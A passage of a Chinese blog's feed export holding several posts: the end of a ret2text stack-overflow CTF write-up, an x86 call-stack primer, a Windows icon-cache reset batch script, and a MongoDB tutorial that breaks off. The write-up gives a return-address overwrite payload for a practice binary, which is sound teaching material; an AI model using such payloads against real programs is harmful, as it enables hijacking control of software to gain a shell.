0x10</span><br><span class="line">10:0040│      0xffffd190 ◂— 0x1</span><br><span class="line">11:0044│      0xffffd194 —▸ 0xffffd224 —▸ 0xffffd3d0 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">12:0048│      0xffffd198 —▸ 0xffffd22c —▸ 0xffffd3f5 ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">13:004c│      0xffffd19c —▸ 0xffffd1b4 ◂— 0x0</span><br><span class="line">14:0050│      0xffffd1a0 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line">15:0054│      0xffffd1a4 ◂— 0x0</span><br><span class="line">16:0058│      0xffffd1a8 —▸ 0xffffd208 —▸ 0xffffd224 —▸ 0xffffd3d0 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">17:005c│      0xffffd1ac ◂— 0x0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们的目的是<strong>覆盖<code>ebp</code>的上一行，也就是返回之后的下一行指令的位置，就是上面的<code>07:001c</code>处</strong>，可以看到我们输入的<code>AAAAAAAA</code>从<code>02:0008</code>开始，所以就是得到下面结论</p><p><strong>先输入20个<code>A</code>，覆盖<code>02:0008</code>-<code>07:001c</code>，然后再输入4字节的特殊数据覆盖<code>07:001c</code>-<code>0024</code>（因为返回地址是32位，4字节），当函数返回时，就会执行我们的特定代码</strong></p><p>同时在<code>IDA</code>中，可以看到一个函数名叫<code>get_shell</code>的函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们把这个函数的地址覆盖<code>07:001c</code>开始，就达到目的啦，那怎么看这个函数的起始地址呢，当然是在<code>IDA</code>中，地址为<code>0x8048522</code></p><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220502205253383.png" alt="image-20220502205253383"></p><p>所以<code>payload</code>为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0x8048522</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上一次我们介绍了函数调用栈，这一次我们就来看一道最简单的栈溢出题目：&lt;code&gt;ret2text&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="http://www.shicoder.top/categories/PWN/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>函数调用栈</title>
    <link href="http://www.shicoder.top/posts/3330740389.html"/>
    <id>http://www.shicoder.top/posts/3330740389.html</id>
    <published>2022-05-02T01:32:58.000Z</published>
    <updated>2022-05-02T08:55:20.603Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>这个分栏我们开始学习PWN，当然PWN也是自己的兴趣爱好，所以可能博客更新较慢，不好意思啦</p><span id="more"></span><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>每个函数都有自己的栈帧，栈底用<code>ebp</code>，栈顶用<code>esp</code>，还有一个<code>eip</code>，表示即将执行的指令的地址，下面是栈的图示，是从高地址向低地址增长</p><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220502093832451.png" alt="image-20220502093832451"></p><p>函数的栈帧包括</p><ul><li>函数的返回地址和参数</li><li>本地变量</li><li>调用前后上下文</li></ul><p>因此比如一个<code>main</code>函数执行时候，<code>ebp</code>指向其栈帧底部，然后在函数运行时候随时<code>push</code>和<code>pop</code>，导致其<code>esp</code>不断变化，当要调用子函数<code>func</code>时候，会先<code>push</code>子函数所需要的参数，然后进入<code>func</code>之后，首先<code>push ebp</code>，因为此时的<code>ebp</code>是<code>main</code>函数的，为了在<code>func</code>函数结束后，找到<code>main</code>函数的<code>ebp</code>，所以先保留，然后<code>mov ebp,esp</code>，这时候<code>ebp</code>就会被赋予新的值，这个值就是<code>func</code>函数栈帧的底部，然后就是一些<code>func</code>函数自己的操作，当要使用传进来的参数时候，就去当时在<code>main</code>调用<code>func</code>前<code>push</code>的参数去取，当执行<code>func</code>函数之后，需要返回到<code>main</code>，此时分两种情况</p><ul><li><code>func</code>中没有使用过局部变量，则进入<code>func</code>之后，<code>ebp</code>和<code>esp</code>始终是一样的，所以直接<code>pop ebp</code>，此时<code>ebp</code>中就存放了<code>call</code>调用前，<code>main</code>的<code>ebp</code></li><li><code>func</code>中使用过局部变量，则进入<code>func</code>之后，首先会<code>sub esp，一些空间</code>来给<code>func</code>使用，然后结束时候，使用<code>leave =&gt; mov esp,ebp、pop ebp</code>，先将<code>esp</code>值变为<code>ebp</code>的值，此时两个一样，然后<code>pop ebp</code>之后，<code>ebp</code>中就存放了<code>call</code>调用前，<code>main</code>的<code>ebp</code></li></ul><p>简单的就是如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">...</span><br><span class="line">    push arg2</span><br><span class="line">    push arg1</span><br><span class="line">    call func</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">; func函数内没有局部变量</span><br><span class="line">func:</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">将main的栈中的参数放到寄存器中</span><br><span class="line">一顿操作</span><br><span class="line">pop ebp</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">; func函数内有局部变量</span><br><span class="line">func:</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x10(就是一段长度，存放局部变量)</span><br><span class="line">将main的栈中的参数放到寄存器中</span><br><span class="line">一顿操作</span><br><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>call    &#x3D;&gt; 等价 push 返回地址，然后eip跳转到sum开头的地方</li><li>leave &#x3D;&gt; 等价 mov esp, ebp 然后 pop ebp</li><li>retn   &#x3D;&gt; 等价 pop eip</li></ul><h1 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h1><p>以下面的c语言代码进行讲解</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">sum</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    4</span><br><span class="line">push    3</span><br><span class="line">call    sum</span><br><span class="line">add     esp, 8</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">mov     edx, [ebp+8]</span><br><span class="line">mov     eax, [ebp+0Ch]</span><br><span class="line">add     eax, edx</span><br><span class="line">pop     ebp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>下面一段视频就是其过程，可以看下</p><p><video width="100%" height="300" controls>     <source src="https://smypicture.oss-cn-beijing.aliyuncs.com/video/%E6%A0%88%E8%B0%83%E7%94%A8.mp4" type="video/mp4"> </video></p><p>后面还有两段有局部变量的，大家也可以自己推导下。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line">c = a + b;</span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line">ret = <span class="built_in">sum</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, 10h</span><br><span class="line">push    4</span><br><span class="line">push    3</span><br><span class="line">call    sum </span><br><span class="line">add     esp, 8</span><br><span class="line">mov     [ebp-4], eax</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave  </span><br><span class="line">retn  </span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, 10h</span><br><span class="line">mov     edx, [ebp+8]</span><br><span class="line">mov     eax, [ebp+0Ch]</span><br><span class="line">add     eax, edx</span><br><span class="line">mov     [ebp-4], eax</span><br><span class="line">mov     eax, [ebp-4]</span><br><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line">ret = <span class="built_in">sum</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, 10h</span><br><span class="line">push    4</span><br><span class="line">push    3</span><br><span class="line">call    sum</span><br><span class="line">add     esp, 8</span><br><span class="line">mov     [ebp-4], eax</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">mov     edx, [ebp+8]</span><br><span class="line">mov     eax, [ebp+0Ch]</span><br><span class="line">add     eax, edx</span><br><span class="line">pop     ebp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个分栏我们开始学习PWN，当然PWN也是自己的兴趣爱好，所以可能博客更新较慢，不好意思啦&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="http://www.shicoder.top/categories/PWN/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>win11下任务栏软件白色</title>
    <link href="http://www.shicoder.top/posts/3813897216.html"/>
    <id>http://www.shicoder.top/posts/3813897216.html</id>
    <published>2022-04-29T01:57:42.000Z</published>
    <updated>2022-04-29T11:45:14.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>批处理内容（管理员身份运行）：</p><span id="more"></span><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /im explorer.exe </span><br><span class="line">attrib -h -s -r &quot;%userprofile%\AppData\Local\IconCache.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\IconCache.db&quot; </span><br><span class="line">attrib /s /d -h -s -r &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\*&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_32.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_96.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_102.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_256.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_1024.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_idx.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_sr.db&quot;  </span><br><span class="line">echo y|reg delete &quot;HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify&quot; /v IconStreams </span><br><span class="line">echo y|reg delete &quot;HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify&quot; /v PastIconsStream </span><br><span class="line">start explorer </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;批处理内容（管理员身份运行）：&lt;/p&gt;</summary>
    
    
    
    <category term="其他" scheme="http://www.shicoder.top/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>mongodb初探</title>
    <link href="http://www.shicoder.top/posts/1579451164.html"/>
    <id>http://www.shicoder.top/posts/1579451164.html</id>
    <published>2022-04-29T01:50:01.000Z</published>
    <updated>2022-05-05T09:30:13.822Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>这次我们开始我们的MongoDB之旅吧</p><span id="more"></span><h1 id="启动和连接MongoDB"><a href="#启动和连接MongoDB" class="headerlink" title="启动和连接MongoDB"></a>启动和连接MongoDB</h1><ul><li>启动，一般以配置文件启动</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt; </span><span class="language-bash">mongod.exe -f ./mongod.conf</span></span><br></pre></td></tr></table></figure><p>最简单的一个config文件就是配置一个存储数据的路径和日志文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">storage:</span><br><span class="line">    #The directory where the mongod instance stores its data.Default Value is &quot;\data\db&quot; on Windows.</span><br><span class="line">    dbPath: D:\mongodb-win32-x86_64-2008plus-ssl-4.0.12\data</span><br><span class="line"></span><br><span class="line">systemLog:</span><br><span class="line">    destination: file</span><br><span class="line">    path: D:\mongodb-win32-x86_64-2008plus-ssl-4.0.12\logs\mongodb.log</span><br></pre></td></tr></table></figure><ul><li>连接，采用mongo</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt; </span><span class="language-bash">mongo.exe</span></span><br></pre></td></tr></table></figure><h1 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h1><ul><li>选择和创建数据库，不存在则自动创建</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 数据库名称</span><br></pre></td></tr></table></figure><ul><li>集合的删除（集合类似表、文档就是一个个json）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.集合.drop</span><br></pre></td></tr></table></figure><ul><li>文档增删改查</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">db.集合.insert(</span><br><span class="line">&lt;document&gt;,</span><br><span class="line">    &#123;</span><br><span class="line">    writeConcern: &lt;document&gt;,</span><br><span class="line">    ordered: &lt;boolean&gt;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">db.集合.insertmany(</span><br><span class="line">[&lt;document1&gt;,&lt;document1&gt;,...]</span><br><span class="line">    &#123;</span><br><span class="line">    writeConcern: &lt;document&gt;,</span><br><span class="line">    ordered: &lt;boolean&gt;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">db.集合.find(&#123;query&#125;,&#123;projection&#125;)</span><br><span class="line">第一个&#123;&#125;为where条件，第二个&#123;&#125;为显示的字段(0表示不显示 1表示显示)</span><br><span class="line"></span><br><span class="line">1、简单的等于</span><br><span class="line">select name, age, skills from users where name = ‘hurry’;</span><br><span class="line">db.users.find(&#123;&#x27;name&#x27; : &#x27;hurry&#x27;&#125;,&#123;&#x27;name&#x27;: 1, &#x27;age&#x27; : 1, &#x27;skills&#x27; : 1&#125;);</span><br><span class="line"></span><br><span class="line">2、使用and</span><br><span class="line">select name, age, skills from users where name = ‘hurry’ and age = 18;</span><br><span class="line">db.users.find(&#123;&#x27;name&#x27; : &#x27;hurry&#x27;, &#x27;age&#x27; : 18&#125;,&#123;&#x27;name&#x27; : 1, &#x27;age&#x27; : 1, &#x27;skills&#x27; : 1&#125;);</span><br><span class="line"></span><br><span class="line">3、使用or</span><br><span class="line">select name, age, skills from users where name = ‘hurry’ or age = 18;</span><br><span class="line">db.users.find(&#123; &#x27;$or&#x27; : [&#123;&#x27;name&#x27; : &#x27;hurry&#x27;&#125;, &#123;&#x27;age&#x27; : 18&#125;] &#125;,&#123;&#x27;name&#x27; : 1, &#x27;age&#x27; : 1, &#x27;skills&#x27; : 1&#125;);</span><br><span class="line"></span><br><span class="line">4、使用in, not in (nin)</span><br><span class="line">select * from users where age in (10, 22, 26);</span><br><span class="line">db.users.find(&#123;&#x27;age&#x27; : &#123;&#x27;$in&#x27; : [10, 22, 26]&#125;&#125;);</span><br><span class="line">select * from users where age not in (10, 22, 26);</span><br><span class="line">db.users.find(&#123;&#x27;age&#x27;:&#123;$nin:[&quot;1003&quot;,&quot;1004&quot;]&#125;&#125;)</span><br><span class="line"></span><br><span class="line">5、&lt;,&lt;=,&gt;,&gt;=</span><br><span class="line">db.集合.find(&#123; &quot;field&quot; : &#123; $gt: value &#125;&#125;) // 大于: field &gt; value</span><br><span class="line">db.集合.find(&#123; &quot;field&quot; : &#123; $lt: value &#125;&#125;) // 小于: field &lt; value</span><br><span class="line">db.集合.find(&#123; &quot;field&quot; : &#123; $gte: value &#125;&#125;) // 大于等于: field &gt;= value</span><br><span class="line">db.集合.find(&#123; &quot;field&quot; : &#123; $lte: value &#125;&#125;) // 小于等于: field &lt;= value</span><br><span class="line">db.集合.find(&#123; &quot;field&quot; : &#123; $ne: value &#125;&#125;) // 不等于: field != value</span><br><span class="line"></span><br><span class="line">查询所有 db.集合.find() 或 db.集合.find(&#123;&#125;)</span><br><span class="line">查询特定 db.集合.find(&#123;userid:&#x27;1003&#x27;&#125;)</span><br><span class="line">返回第一条数据 db.集合.findOne(&#123;userid:&#x27;1003&#x27;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db.集合.remove(&#123;&#125;) 全部删除</span><br><span class="line">db.集合.remove(&#123;&#x27;userid&#x27;:&#x27;1003&#x27;&#125;)</span><br></pre></td></tr></table></figure><ul><li>文档更新</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.集合.update(</span><br><span class="line">   &lt;query&gt;,</span><br><span class="line">   &lt;update&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     upsert: &lt;boolean&gt;,</span><br><span class="line">     multi: &lt;boolean&gt;,</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>query : update的查询条件，类似sql update查询内where后面的。</li><li>update : update的对象和一些更新的操作符（如$,$inc…）等，也可以理解为sql update查询内set后面的</li><li>upsert : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。</li><li>multi : 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。</li><li>writeConcern :可选，抛出异常的级别。</li></ul><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220504111323879.png" alt="image-20220504111323879"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;db.col.insert(&#123;</span><br><span class="line">    title: &#x27;MongoDB 教程&#x27;, </span><br><span class="line">    description: &#x27;MongoDB 是一个 Nosql 数据库&#x27;,</span><br><span class="line">    by: &#x27;菜鸟教程&#x27;,</span><br><span class="line">    url: &#x27;http://www.runoob.com&#x27;,</span><br><span class="line">    tags: [&#x27;mongodb&#x27;, &#x27;database&#x27;, &#x27;NoSQL&#x27;],</span><br><span class="line">    likes: 100</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&gt;db.col.update(&#123;&#x27;title&#x27;:&#x27;MongoDB 教程&#x27;&#125;,&#123;$set:&#123;&#x27;title&#x27;:&#x27;MongoDB&#x27;&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)   # 输出信息</span><br><span class="line">&gt; db.col.find().pretty()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;56064f89ade2f21f36b03136&quot;),</span><br><span class="line">        &quot;title&quot; : &quot;MongoDB&quot;,</span><br><span class="line">        &quot;description&quot; : &quot;MongoDB 是一个 Nosql 数据库&quot;,</span><br><span class="line">        &quot;by&quot; : &quot;菜鸟教程&quot;,</span><br><span class="line">        &quot;url&quot; : &quot;http://www.runoob.com&quot;,</span><br><span class="line">        &quot;tags&quot; : [</span><br><span class="line">                &quot;mongodb&quot;,</span><br><span class="line">                &quot;database&quot;,</span><br><span class="line">                &quot;NoSQL&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;likes&quot; : 100</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><ul><li>文档统计查询</li></ul><figure class="highlight 